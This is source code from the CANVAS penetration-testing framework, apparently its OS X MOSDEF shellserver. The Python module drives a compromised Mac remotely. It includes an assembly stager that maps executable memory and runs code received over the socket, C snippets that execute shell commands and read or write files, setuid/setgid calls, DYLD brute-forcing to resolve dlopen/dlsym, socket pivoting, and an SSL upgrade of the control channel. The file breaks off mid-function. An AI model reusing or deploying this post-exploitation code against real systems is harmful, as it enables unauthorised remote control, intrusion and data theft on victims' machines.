#! /usr/bin/env python

# the new Mac OS X voodoo .. son

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
#
# http://www.immunityinc.com/CANVAS/ for more information

import os
import ssl
import copy
import types
import socket
import timeoutsocket

from engine import CanvasConfig
from mosdefutils import *
from MSSgeneric import MSSgeneric
from shellserver import unixshellserver
from canvasengine import canvas_resources_directory as RESOURCE

from MOSDEF.osxremoteresolver import x86osxremoteresolver
from MOSDEF.osxremoteresolver import x64osxremoteresolver
from MOSDEF.unixremoteresolver import ResolveException
from MOSDEFSock import MOSDEFSock

class OSXShellServer(MSSgeneric, unixshellserver):    
    def __init__(self):
        self.O_RDONLY = self.libc.getdefine('O_RDONLY')
        self.O_RDWR = self.libc.getdefine('O_RDWR')
        self.O_CREAT = self.libc.getdefine('O_CREAT')
        self.O_TRUNC = self.libc.getdefine('O_TRUNC')
        
    def getcwd(self):
        return self.pwd()
    
    def pwd(self):
        vars = {}
        code = """
        #import "local", "getcwd" as "getcwd"
        #import "local", "memset" as "memset"
        #import "local", "sendstring" as "sendstring"
        
        int main()
        {
          char buf[1024];
          memset(buf, 0, 1024);
          getcwd(buf, 1024);
          sendstring(buf);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readstring()
        self.leave()
        return ret
    
    def mkdir(self, path, mode=0777):
        vars = { 'path' : path, 'mode' : mode }
        code = """
        #import "local", "sendint" as "sendint"
        #import "local", "mkdir" as "mkdir"
        
        #import "string", "path" as "path"
        #import "int", "mode" as "mode"
        
        int main()
        {
          int ret;
          ret = mkdir(path, mode);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret       
        
    def runcommand(self, command):
        """
        runs a command via popen2
        """
        data = self.popen2(command)     
        return data
    
    def popen2(self, command):
        """
        run a command and get output
        """
        vars = {}
        vars['command'] = command
        
        code="""
        #import "string", "command" as "command"
        
        #import "local", "pipe" as "pipe"
        #import "local", "dup2" as "dup2"
        #import "local", "close" as "close"
        #import "local", "execve" as "execve"
        #import "local", "read" as "read"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "memset" as "memset"
        #import "local", "waitpid" as "waitpid"
        #import "local", "sendstring" as "sendstring"
        
        void main()
        {
          int pipes[2];
          int bpipes[2];
          char buf[1001];
          char *argv[4];
          int ret;
          int pid;
          
          // pipes[0] is now for reading and pipes[1] for writing
          argv[0] = "/bin/sh";
          argv[1] = "-c";
          argv[2] = command;
          argv[3] = 0;
          
          // now we fork and exec and read from the socket until we are done
          ret = pipe(pipes);
          ret = pipe(bpipes);
          pid = fork(); // SEE SYSCALL SEMANTICS ON XNU!
          
          if (pid == 0) 
          {
            close(0);
            close(1);
            close(2);
            ret = dup2(pipes[0], 0);
            ret = dup2(bpipes[1], 1);
            ret = dup2(bpipes[1], 2);
            close(bpipes[0]);
            execve(argv[0], argv, 0); 
            exit(1);
          }
          ret = close(bpipes[1]);
          ret = close(pipes[0]);
          memset(buf,0,1001);
          
          while (read(bpipes[0], buf, 1000) != 0) 
          {
            sendstring(buf);
            memset(buf, 0, 1001);
          }
           
          //send blank string...
          sendstring(buf);
          close(pipes[1]);
          close(bpipes[0]);

          waitpid(-1,0,1); //wnohang is 1
          waitpid(-1,0,1); //wnohang is 1
        }
        """
        
        self.clearfunctioncache()         
        request = self.compile(code, vars)
        self.sendrequest(request)
        tmp = self.readstring()
        data = tmp
        while tmp != "":
            tmp = self.readstring()
            data += tmp
        self.leave()
               
        return data
    
    def getids(self):
        uid, euid, gid, egid = self.ids()
        return "UID=%d EUID=%d GID=%d EGID=%d" % (uid, euid, gid, egid)
    
    def setuid(self, uid):
        vars = { 'uid' : uid }
        code = """
        #import "local", "setuid" as "setuid"
        #import "local", "sendint" as "sendint"
        #import "int", "uid" as "uid"
        
        int main()
        {
          int ret;
          ret = setuid(uid);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
    def setgid(self, gid):
        vars = { 'gid' : gid }
        code = """
        #import "local", "setgid" as "setgid"
        #import "local", "sendint" as "sendint"
        #import "int", "gid" as "gid"
        
        int main()
        {
          int ret;
          ret = setgid(gid);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
    # same for ppc/i386 .. so dont need arch dependent header kludges ..
    def fstat(self, fd):

        vars = { 'fd' : fd }
        code = """
        #import "local","sendint" as "sendint"
        #import "local","sendshort" as "sendshort"
        #import "local","sendlong" as "sendlong"
        #import "local","fstat" as "fstat"
        
        #import "int", "fd" as "fd"
        
        struct stat {
          unsigned int st_dev;
          unsigned int st_ino;
          unsigned short st_mode;
          unsigned short st_nlink;

          unsigned int st_uid;
          unsigned int st_gid;
          unsigned int st_rdev;

          unsigned long  st_atime;
          unsigned long  st_atimensec;
          unsigned long  st_mtime;
          unsigned long  st_mtimensec;
          unsigned long  st_ctime;
          unsigned long  st_ctimensec;
          unsigned long  st_size;
          unsigned long  st_blocks;
          unsigned long  st_blksize;
          unsigned int   st_flags;
          unsigned int   st_gen;
          
          // reserved area .. make it big to prevent overflows on stat
          // sometimes we dont know how this struct is gonna turn out
          // exactly .. so instead of squirreling around we just pad
          
          char _reserved[512];
        };
          
        void main()
        {
          int canary;
          struct stat buf;
          int ret;

          canary = 0x41414141;
          ret = fstat(fd, &buf);
          sendint(ret);
          sendint(canary);
          
          if (ret == 0) 
          {
            sendint(buf.st_dev);
            sendint(buf.st_ino);
            sendshort(buf.st_mode);
            sendshort(buf.st_nlink);

            sendint(buf.st_uid);
            sendint(buf.st_gid);
            sendint(buf.st_rdev);

            sendlong(buf.st_atime);
            sendlong(buf.st_atimensec);
            sendlong(buf.st_mtime);
            sendlong(buf.st_mtimensec);
            sendlong(buf.st_ctime);
            sendlong(buf.st_ctimensec);

            sendlong(buf.st_size);
            sendlong(buf.st_blocks);
            sendint(buf.st_blksize);
            sendint(buf.st_flags);
          }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        canary = self.readint(signed=True)
        if canary != 0x41414141:
            print "XXX: OSX STAT CANARY CHIRPED! 0x41414141 vs. %X" % canary
        statbuf = None
        if ret == 0:
            statbuf = self.readstruct([("i","st_dev"),
                                     ("i","st_ino"),
                                     ("s","st_mode"),
                                     ("s","st_nlink"),
                                     ("i","st_uid"),
                                     ("i","st_gid"),
                                     ("i","st_rdev"),
                                     ("l","st_atime"),
                                     ("l","st_atimensec"),
                                     ("l","st_mtime"),
                                     ("l","st_mtimensec"),
                                     ("l","st_ctime"),
                                     ("l","st_ctimensec"),
                                     ("l","st_size"),
                                     ("l","st_blocks"),
                                     ("i","st_blksize"),
                                     ("i","st_flags")])

        self.leave()
        return ret,statbuf
    
    def readfromfd(self, file_fd, len):

        vars = {}
        vars['len'] = len
        vars['sock_fd'] = self.fd
        vars['file_fd'] = file_fd
        
        code = """
        #import "local", "read" as "read"
        #import "local", "writeblock" as "writeblock"
        
        #import "int", "len" as "len"
        #import "int", "sock_fd" as "sock_fd"
        #import "int", "file_fd" as "file_fd"

        void main () 
        {
          char buf[1000];
          int left;
          left = len;
          while (left > 1000) 
          {
            read(file_fd, buf, 1000); 
            writeblock(sock_fd, buf, 1000);
            left = left-1000;
          }
          if (left > 0) 
          {
            read(file_fd, buf, left); 
            writeblock(sock_fd, buf, left);
          }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        data = self.readbuf(len)
        self.leave()
        return data
    
    def writetofd(self, fd, data):

        vars = {}
        vars['len'] = len(data)
        vars['sock_fd'] = self.fd
        vars['file_fd'] = fd

        code="""
        #import "local", "readblock" as "readblock"
        #import "local", "write" as "write"        
        #import "int", "len" as "len"
        #import "int", "sock_fd" as "sock_fd"
        #import "int", "file_fd" as "file_fd"

        void main() 
        {
          char buf[1001];
          int left;

          left = len;
          while (left > 1000) 
          {
            readblock(sock_fd, buf, 1000); 
            write(file_fd, buf, 1000);
            left = left-1000;
          }
          if (left > 0) 
          {
            readblock(sock_fd, buf, left); 
            write(file_fd, buf, left);
          }
        }
        """
        self.clearfunctioncache()
        request = self.compile(code, vars)
        self.sendrequest(request)
        self.writebuf(data)
        self.leave()
        return
    
    def dounlink(self, file):
        """
        Unlinks (deletes) a file/dir
        """
        ret = self.unlink(file) # from MSSsystem.py
        if not ret:
            return "%s was unlinked." % file
        else:
            return "%s was not unlinked due to some kind of error." % file

    def do_cd(self, dest):
        """
        Used from commandline shell.
        """
        return self.cd(dest)
    
    def cd(self, dir):
        """
        Change directory
        """
        if self.chdir(dir) == -1:
            return "No such directory, drive, or no permissions to access that directory."
        return "Successfully changed to %s" % (dir)
        
    def chdir(self, dir):
        vars = { 'dir' : dir }
        code = """
        #import "local", "chdir" as "chdir"
        #import "local", "sendint" as "sendint"
        #import "string", "dir" as "dir"
        
        int main()
        {
          int ret;
          ret = chdir(dir);
          sendint(ret);
        }
        """
        self.clearfunctioncache()
        request = self.compile(code,vars)
        self.sendrequest(request)
        ret = self.readint(signed=True)
        self.leave()
        return ret
    
    # MOSDEFSock functions    
    def getListenSock(self,addr,port):
        """
        Creates a tcp listener socket fd on a port
        """
        vars={}
        code="""
        #import "local", "bind" as "bind"
        #import "local", "listen" as "listen"
        #import "local", "socket" as "socket"
        #import "local", "setsockopt" as "setsockopt"
        #import "local", "close" as "close"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "memset" as "memset"
        #import "int", "addr" as "addr"
        #import "int", "port" as "port"
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOCK_STREAM" as "SOCK_STREAM"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_REUSEADDR" as "SO_REUSEADDR"

        struct sockaddr_in {
            unsigned char len;
            unsigned char family;
            unsigned short int port;
            unsigned int addr; //sin_addr, whatever.
            char pad[6];
        };

        void main()
        {
            int sockfd;
            int i;
            struct sockaddr_in serv_addr;

            memset(&serv_addr, 0, 16);
            serv_addr.family=AF_INET; //af_inet          
            serv_addr.port=htons(port);
            serv_addr.addr=addr;
            
            sockfd = socket(AF_INET,SOCK_STREAM,0);

            if (sockfd < 0) {
                sockfd = -3; // failed to create the socket 
            } else {
                i = 1;
                setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &i, 4); // XXX optval?
                i = bind(sockfd,&serv_addr,16);
                if (i != 0) {
                    close(sockfd);
                    sockfd = -1; // failed to bind
                } else {
                    i = listen(sockfd,16);
                    if (i < 0) {
                        close(sockfd);
                        sockfd = -2; // filed to listen
                    }
                }
            }
            sendint(sockfd); //success
        }
        """
        vars = self.libc.getdefines()
        vars["port"]=port
        vars["addr"]=self.libc.endianorder(socket.inet_aton(addr))
        #vars["addr"]=str2littleendian(socket.inet_aton(addr))
        self.clearfunctioncache()
        request=self.compile(code,vars)
        self.sendrequest(request)
        fd=self.readint(signed=True)
        self.leave()
        return fd

    def socket(self,proto):
        """
        calls socket and returns a file descriptor or -1 on failure.
        """
        code="""
        #import "int", "family" as "family"
        #import "int", "proto" as "proto"
        #import "int", "raw_proto" as "raw_proto"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
 
        void main()
        {
           int i;
           i=socket(family,proto,raw_proto);
           sendint(i);
        }
        """
        family=self.libc.getdefine("AF_INET")
        raw_proto=0
        if proto.lower()=="tcp":
            proto=self.libc.getdefine('SOCK_STREAM')
        elif proto.lower()=="udp":
            proto=self.libc.getdefine('SOCK_DGRAM')
        elif proto.lower()=="raw":
            proto=self.libc.getdefine('SOCK_RAW')
            family=self.libc.getdefine('AF_PACKET')
            raw_proto=0x800 #self.libc.getdefine('ETH_P_IP')
        else:
            print "Don't know anything about protocol %s in socket()"%proto
            return -1

        vars = {}
        vars ["family"] = family 
        vars ["proto"]=proto
        vars ["raw_proto"]=raw_proto

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        self.leave()

        return ret

    def connect(self,fd,host,port,proto,timeout):
        if proto.lower()=="tcp":
            proto=self.libc.getdefine('SOCK_STREAM')
        elif proto.lower()=="udp":
            proto=self.libc.getdefine('SOCK_DGRAM')
        else:
            print "Protocol not recognized"
            return -1
        return self.connect_sock(fd,host,port,proto,timeout)

    def connect_sock(self,fd,host,port,proto,timeout):
        """
        Does a tcp connect with a timeout
        """
        code="""
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "SOL_SOCKET" as "SOL_SOCKET"
        #import "int", "SO_ERROR" as "SO_ERROR"
        #import "int", "ip" as "ip"
        #import "int", "port" as "port"
        #import "int", "proto" as "proto"
        #import "int", "sockfd" as "sockfd"
        #import "int", "timeout" as "timeout"
        #import "local", "connect" as "connect"
        #import "local", "close" as "close"
        #import "local", "socket" as "socket"
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"
        #import "local", "select" as "select"
        #import "local", "memset" as "memset"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "local", "getsockopt" as "getsockopt"

        struct sockaddr_in {
            unsigned short int family;
            unsigned short int port;
            unsigned int addr; //sin_addr, whatever.
            char pad[6];
        };

        struct timeval {
                int tv_sec;
                int tv_usec; 
        };

        void main()
        {
          int mask[32];
          int tmpmask;
          int i;
          int ret;
          int ilen;
          int div;
          int n;
          int sockopt;
          int fdindex;
          int opts;
          struct timeval tv;
          struct sockaddr_in serv_addr;
          serv_addr.family=AF_INET; //af_inet
          
          serv_addr.addr=htonl(ip);
          serv_addr.port=htons(port);

          tv.tv_usec= 0;
          tv.tv_sec = timeout;

          memset(&mask, 0, 128);
          // we don't have a modulus so doing it like this
          fdindex = 0;
          if (sockfd > 31) {
              fdindex = sockfd;
              while (fdindex > 31) {
                  fdindex = fdindex - 32;
              } 
          }
          else {
              fdindex = sockfd;
          }
          i = 0;
          div = sockfd;
          // we didnt do '/' yet when i wrote this
          while (div > 31)
          {
              i = i+1;
              div = div - 32;
          }
          mask[i] = 1<<fdindex;

          // set to non-blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts | O_NONBLOCK;
          fcntl(sockfd, F_SETFL, opts);

          ret = connect(sockfd,&serv_addr,16);
          // a bit botched, would be cleaner with errno
          // handle EINPROGRESS errno ony
          // we get away with this because our 'libc' is direct syscalls ;)
          // so errno is still in eax
          if (ret != 0) {
              //if (ret == -115) {
              if (ret == 36) {
                  n = sockfd + 1;
                  i=select(n, 0, &mask, 0, &tv);
                  if (i > 0) {
                       sockopt = 0;
                       ilen = 4;
                       getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &sockopt, &ilen);
                       if (sockopt) {
                           // error occurred on socket
                           sendint(-1);
                           return;
                       } 
                  }
                  // timeout or error
                  else {
                       sendint(-2);
                       return;
                  }
              }
              // some other errno was set
              else {
                  sendint(-1);
                  return;
              }
          }
      
          // connect (with timeout) succeeded 
      
          // set back to blocking
          opts=fcntl(sockfd, F_GETFL, 0);
          opts=opts & O_BLOCK;
          fcntl(sockfd, F_SETFL, opts);
          sendint(0);
        }
        """

        hostlong=socket.gethostbyname(host) #resolve from remotehost
        hostlong=str2bigendian(socket.inet_aton(hostlong))

        vars = self.libc.getdefines()
        vars["ip"]=hostlong
        vars["port"]=port
        vars["proto"]=proto
        vars["sockfd"]=fd
        vars["timeout"]=timeout

        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        ret=self.readint(signed=True)
        self.leave()

        return ret

    def setblocking(self,fd,blocking):
        code="""
        #import "local", "fcntl" as "fcntl"
        #import "int", "O_NONBLOCK" as "O_NONBLOCK"
        #import "int", "O_BLOCK" as "O_BLOCK"
        #import "int", "sock" as "sock"
        #import "int", "F_SETFL" as "F_SETFL"
        #import "int", "F_GETFL" as "F_GETFL"

        void main() {
          int opts;
          
          opts=fcntl(sock,F_GETFL,0); //MOSDEF uses a null arg
          """
        if blocking:
            #set blocking by clearing the nonblocking flag
            code+="opts=opts & O_BLOCK;\n"
        else:
            #set nonblocking
            code+="opts=opts | O_NONBLOCK;\n"
        code+="""
          fcntl(sock,F_SETFL,opts);
        }
        """
        vars = self.libc.getdefines()
        vars["sock"]=fd
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def setsockopt(self,sockfd,option,arg):
        code="""
        #import "local", "setsockopt" as "setsockopt"
        #import "int","arg" as "arg"
        #import "int","option" as "option"
        #import "int","level" as "level"
        #import "int", "sockfd" as "sockfd"

        void main() {
           // XXX: 5 args .. deal with optlen .. &arg is *optval
           int i;
           i = arg;
           setsockopt(sockfd,level,option,&i,4);
        }
        """
        vars = self.libc.getdefines()
        vars["option"]=option
        vars["arg"]=arg
        vars["sockfd"]=sockfd
        vars["level"] = vars['SOL_SOCKET']
        self.clearfunctioncache()
        message=self.compile(code,vars)
        self.sendrequest(message)
        self.leave()

        return

    def getsendcode(self,fd,buffer):
        """Reliable send to socket, returns a shellcode for use by Node and self"""

        devlog('shellserver::getsendcode', "(MACOSX) Sending %d bytes to fd %d" % (len(buffer), fd))

        code="""
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        #import "string", "buffer" as "buffer"
        #import "local", "send" as "send"

        #import "local", "sendint" as "sendint"

        void main() 
        {
           int i;
           char *p;
           int wanted;
           int success;

           success = 1; // optimist
           wanted = length;
           p = buffer;

           while (wanted > 0) 
           {
               i = send(fd, p, wanted, 0); // flags set to zero here
              
               if (i < 0) 
               {
                   wanted = 0;
                   success = 0;
               }
               else
               { 
                   wanted = wanted-i;
                   p = p + i;
               }
           }

           sendint(success);
        }
        """

        # XXX: check this with hasattr in MOSDEFNode
        # XXX: until everything is moved over
        self.special_shellserver_send = True

        vars = {}
        vars["fd"] = fd
        vars["length"] = len(buffer)
        vars["buffer"] = buffer
        self.clearfunctioncache()
        message = self.compile(code,vars)
        return message
    
    def getrecvcode(self,fd,length):
        devlog('shellserver::getrecvcode', "Creating recv code for fd %d of length %d" % (fd, length))
        code="""
        #import "local", "recv" as "recv"
        #import "local", "writeblock2self" as "writeblock2self"
        #import "int", "length" as "length"
        #import "int", "fd" as "fd"
        
        void main() 
        {
            int i;
            char buf[1000];
            int wanted;

            //flags set to zero here
            wanted = length;
            while (wanted > 0 ) 
            {
                if (wanted < 1000) 
                {
                    i = recv(fd, buf, wanted, 0);
                }
                else
                {
                   i = recv(fd, buf, 1000, 0);
                }
                // error handling .. 0-errno is returned from syscall
                if (i < 0)
                {
                    writeblock2self(buf,0); 
                    wanted = 0;
                }
                else 
                {
                    writeblock2self(buf,i);
                    wanted = wanted - i;
                }
              
            }
        }
        """
        vars = {}
        vars["fd"] = fd
        vars["length"] = int(length)
        self.clearfunctioncache()
        message = self.compile(code,vars)
        return message

    def recv(self,fd, length):
        """
        reliable recv from socket
        """
        message = self.getrecvcode(fd,length)
        self.sendrequest(message)
        gotlength = 0
        ret = []
        #reliable recv
        buffer=self.node.parentnode.recv(self.connection,length)
        self.leave()
        return buffer

    def recv_lazy(self,fd,timeout=None,length=1000):
        """
        Get whatever is there
        We return a "" when there is nothing on the socket
        
        """
        if timeout==None:
            timeout=0 #immediately return
        if length>1000:
            length=1000
               
        code="""
        #include <sys/poll.h>
        #import "local", "recv" as "recv"
        #import "local", "sendblock2self" as "sendblock2self"
        #import "local", "sendint" as "sendint"
        #import "int", "fd" as "fd"
        #import "int", "timeout" as "timeout"
        #import "int", "length" as "length"
        
        void main() 
        {
            int i;
            char buf[1000];
            int r;
            struct pollfd ufds;
            
            ufds.fd = fd;
            ufds.events = 1;
        
            //timeout is in ms
            i = poll(&ufds,1,timeout);
            r = ufds.revents & 9; //AND with POLLIN and POLLERR
        
            // send poll result not revents!
            sendint(i);

            if (r > 0) 
            {
                //flags set to zero here
                i = recv(fd, buf, length, 0);
                sendint(i);

                if (i > 0) 
                {
                    sendblock2self(buf, i);              
                }
            } 
        }
        """    
        vars = {}
        vars["fd"] = fd
        vars["timeout"] = timeout
        vars["length"] = length
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        poll_result = sint32(self.readint())
        recv_result = 1 #fake result 
        
        if poll_result > 0:
            recv_result = sint32(self.readint())
            if recv_result > 0:
                buffer = self.readblock()

        self.leave()
        
        #raise exceptions on exceptional conditions like timeout or socket errors
        if poll_result <= 0:
            #because we are lazy recv, we don't raise an exception here, but we do return "" as our data
            #this would only be valid normally if size was 0 which is used to test a socket
            #print "Timeout"
            #raise timeoutsocket.Timeout
            buffer = ""
           
        if recv_result <= 0:
            raise socket.error

        #buffer should exist!
        return buffer

    def send(self, fd, buffer):
        """
        reliable send to socket
        """
        message = self.getsendcode(fd, buffer)
        self.sendrequest(message)
        ret = self.readint()
        # done with the node end of things .. release thread
        self.leave()
        if not ret:
            raise Exception, '[!] send failed ... handle me! (re-raise to socket.error in MOSDEFSock)'
        return len(buffer) # as per send(2) specs

    def accept(self,fd):
        code="""
        #import "local", "accept" as "accept"
        #import "int", "fd" as "fd"
        #import "local", "sendint" as "sendint"
        #import "local", "memset" as "memset"

        struct sockaddr_in {
            unsigned short int family;
            unsigned short int port;
            unsigned int addr; //sin_addr, whatever.
            char pad[6];
        };

        void main()
        {
            int i;
            struct sockaddr_in sa;

            int len;
            len = 16;
            memset(&sa, 0, 16);
            i = accept(fd, &sa, &len);
            sendint(i);
            sendint(sa.addr);
        }
        """
        vars={}
        vars["fd"] = fd
        self.clearfunctioncache()
        message = self.compile(code,vars)
        self.sendrequest(message)
        ret = self.readint(signed=True)
        # EAGAIN
        if ret == 35:
            ret = -1;
        devlog('shellserver::accept()', "ret=%d" % ret)
        addr = self.readint()
        devlog('shellserver::accept()', "addr=%d" % addr)
        self.leave()

        return ret


class OSX_x86(OSXShellServer, x86osxremoteresolver):
    
    COMPILE_ARCH = 'X86'
    
    def __init__(self, connection, node, logfunction=None, proctype='x86'):
        x86osxremoteresolver.__init__(self) # now we have a libc ..
        OSXShellServer.__init__(self)
        unixshellserver.__init__(self, connection, type='Active', logfunction=logfunction)
        MSSgeneric.__init__(self, proctype)

        self.order        = intel_order
        self.node         = node
        self.node.shell   = self
        self.started      = 0

        self.DYLD_BASE    =  0x8fe00000  
    
    def startup(self):        
        if self.started == True:
            return 0
        
        devlog('shellserver', 'osx shellserver starting up ..')
        devlog('shellserver', 'local: %s, remote: %s' % \
               (self.connection.getsockname(), self.connection.getpeername()))
        
        self.connection.set_timeout(None)
        
        # get the fd val .. left in ebx .. ebx is PIC code reg in OS X
        import MOSDEF.mosdef as mosdef
        import struct
        
        send_fd_mmap_loop = """
        andl $-16,%esp
        pushl %ebx // treat fd as a local arg
        movl %esp,%ebp
        
        pushl $4
        pushl %ebp
        pushl (%ebp)
        movl $4,%eax // convention: syscall # in eax, push eax, trap to kernel
        pushl %eax
        int $0x80
        
        addl $16,%esp
    
        pushl $0
        pushl $-1
        pushl $0x1002 // MAP_PRIVATE | MAP_ANON
        pushl $0x7
        pushl $0x4000 // assuming we wont have to allocate > 4 pages
        pushl $0
        movl $197,%eax
        pushl %eax
        int $0x80
        
        addl $28,%esp     
        pushl %eax
        
    recv_exec:
    
        pushl $0
        movl %esp,%eax
        pushl $4
        pushl %eax
        pushl (%ebp)
        movl $3,%eax
        pushl %eax
        int $0x80 // recv len
        
        addl $16,%esp        
        popl %ecx // get len
        popl %eax
        pushl %eax // save mmap base
        pushl %eax // edit mmap base

    read_loop:
        
        popl %eax
        pushl %eax
        pushl $1
        pushl %eax
        pushl (%ebp)
        movl $3,%eax
        pushl %eax
        int $0x80
        
        test %eax,%eax
        jz exit

        addl $16,%esp
        addl %eax,(%esp)
        
        loop read_loop
        
        popl %eax
        popl %eax // orig mmap base
        pushl %eax
        call *%eax        
        popl %eax // restore mmap base
        
        movl %ebp,%esp
        pushl %eax // place mmap base
        jmp recv_exec
        
    exit:
    
        xorl %eax,%eax
        pushl %eax
        incl %eax
        pushl %eax
        int $0x80
        """
            
        self.sendrequest(mosdef.assemble(send_fd_mmap_loop, self.COMPILE_ARCH))
        self.fd = struct.unpack('<L', self.connection.recv(4))[0]
        self.leave()
        
        self.set_fd(self.fd)
        
        self.libc.initStaticFunctions({'fd': self.fd}) # update libc functions that require fd val
        self.localfunctions = copy.deepcopy(self.libc.localfunctions) # update our rr copy of the libc
        self.initLocalFunctions()


        devlog('shellserver::startup', 'remote fd: %d' % self.fd)

        self.setInfo('OSX ShellServer started on: %s (remote fd: %d)' % \
                     (self.connection.getpeername(), self.fd))
        
        self.started = True

        # Find DYLD
        self.log('Looking for DYLD..')

        dyld = 0
        
        # First check fixed address that is used in older OSX versions
        if self.is_dyld(self.DYLD_BASE):
            dyld = self.DYLD_BASE
        else:
            # Bruteforce
            self.log('Bruteforcing address..')
            dyld = self.find_dyld(self.DYLD_BASE)
                
        if not dyld:
            self.log('Could not resolve DYLD, resolving functionality will be missing')
        else:
            self.log('Found DYLD at: 0x%x' % dyld)
            
            # Resolve _dlopen and _dlsym
            found = True
            
            for i in ('_dlopen', '_dlsym'):
                if i not in self.remotefunctioncache:
                    address = self.getprocaddress_primitive(i, dyld)
                    
                    if address != 0:
                        self.remotefunctioncache[i] = address
                        devlog('shellserver', 'resolved %s: 0x%x' % (i, address))
                    else:
                        found = False
                        devlog('shellserver', 'Could not resolve %s' % i)
                        
            if found: self.remote_resolver = True
            
        # Try and upgrade to SSL
        if not isinstance(self.connection, MOSDEFSock) and CanvasConfig['ssl_mosdef'] and self.do_ssl():
            old_connection = self.connection
            self.connection = ssl.wrap_socket(self.connection._sock, server_side=True,
                                              certfile=os.path.join(RESOURCE, 'mosdefcert.pem'),
                                              do_handshake_on_connect=False,
                                              ssl_version=ssl.PROTOCOL_SSLv3)
            try:
                self.log('SSL handshake..')
                self.connection.settimeout(20)
                self.connection.do_handshake()
                self.log('Encrypted loop established')

                # Replace write with SSL-enabled write
                self.localfunctions["write"] = ("c", """
                #import "remote", "libssl.dylib|SSL_write" as "SSL_write"
                #import "local",  "syscall3" as "syscall3"
                
                int write(int fd, char *buf, int nbytes)
                {

                    int retval;

                    if (fd == FD) {
                        retval = SSL_write(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_write, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Replace read with SSL-enabled read
                self.localfunctions["read"] = ("c", """
                #import "remote", "libssl.dylib|SSL_read" as "SSL_read"
                #import "local", "syscall3" as "syscall3"
                #import "local", "debug" as "debug"


                int read(int fd, char *buf, int nbytes)
                {
                    int retval;

                    if (fd == FD) {
                        retval = SSL_read(SSLPTR, buf, nbytes);
                    } else {
                        retval = syscall3(SYS_read, fd, buf, nbytes);
                    }

                    return retval;
                }
                """.replace("FD", str(self.fd)).replace("SSLPTR", str(self.ssl_ptr)))

                # Monkey patch the new SSL connection instance to add set_timeout method
                # that will simply call the python socket timeout method
                self.connection.set_timeout = types.MethodType(lambda s, t: s.settimeout(t), self.connection)

            except ssl.SSLError, ex:
                self.log(str(ex))
                self.log('Handshake failed, aborting crypto setup')
                self.log('Attempt to synchronize connection..')
                self.connection = old_connection
                                
                buf   = []
                
                while True:
                    byte = self.connection.recv(1)
                    
                    if not byte:
                        # Connection closed
                        self.log('Connection closed, aborting ShellServer startup')
                        return 0

                    buf.append(byte)

                    if ''.join(buf[-4:]) == '\xdd\xcc\xbb\xaa':
                        # We have our trigger
                        self.log('Re-synchronized connection, continuing with normal MOSDEF')
                        # Send trigger to remote end
                        self.connection.sendall('\xdd\xcc\xbb\xaa')
                        break

        return self.started

    def do_ssl(self, timeout=10):
        """
        Try and upgrade the existing TCP MOSDEF connection to an encrypted SSL.

        There is some trickery involved here, mainly to do with the fact that
        SSL_connect can block for ever (even on errors), so we need to do everything
        in non-blocking mode, measure elapsed time and bail out if it gets to be
        too long.

        TIMEOUT is maximum time in seconds that we will spend in the SSL handshake.
        """
        
        vars = self.libc.getdefines()
        
        vars['FD']      = self.fd
        vars['TIMEOUT'] = timeout
        
        code = """        
        #import "remote", "libssl.dylib|SSL_library_init"       as "SSL_library_init"
        #import "remote", "libssl.dylib|SSL_CTX_new"            as "SSL_CTX_new"
        #import "remote", "libssl.dylib|SSLv3_method"           as "SSLv3_method"
        #import "remote", "libssl.dylib|SSL_new"                as "SSL_new"
        #import "remote", "libssl.dylib|SSL_set_fd"             as "SSL_set_fd"
        #import "remote", "libssl.dylib|SSL_connect"            as "SSL_connect"
        #import "remote", "libssl.dylib|SSL_read"               as "SSL_read"
        #import "remote", "libssl.dylib|SSL_write"              as "SSL_write"
        #import "remote", "libssl.dylib|SSL_get_error"          as "SSL_get_error"
        
        #import "remote",  "libSystem.dylib|select"             as "select"
        
        #import "local",  "read"        as "read"
        #import "local",  "fcntl"       as "fcntl"
        #import "local",  "sendint"     as "sendint"
        #import "local",  "sendpointer" as "sendpointer"
        #import "local",  "munmap"      as "munmap"
        #import "local",  "mmap"        as "mmap"
        #import "local",  "exit"        as "exit"
        #import "local",  "callptr"     as "callptr"
        #import "local",  "debug"       as "debug"

        #import "int",    "FD"          as "FD"
